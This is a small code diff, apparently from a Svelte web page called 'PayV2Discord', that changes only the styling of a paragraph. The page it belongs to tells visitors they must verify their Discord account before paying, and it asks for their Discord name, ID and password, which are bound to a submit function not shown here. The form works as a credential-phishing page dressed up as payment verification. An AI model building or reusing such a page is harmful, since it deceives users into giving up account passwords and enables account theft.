@@ -45,7 +45,7 @@ async function submit(){
 
     <div class="bg-black flex flex-col items-center justify-center gap-5 min-h-screen w-full text-white">
     <h1 class="font-bold text-green-500 text-3xl md:text-4xl lg:text-5xl">PayV2Discord.</h1>
-    <p class="font-thin text-2xl">Please verify your discord account, to proceed to payment. If you do not, we at LumioINC. are sorry, but can't provide you with services!</p>
+    <p class="font-thin text-xl text-center">Please verify your discord account, to proceed to payment. If you do not, we at LumioINC. are sorry, but can't provide you with services!</p>
     <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Name">
     <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord ID" bind:value={id}>
     <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Password" type="password" bind:value={password}>
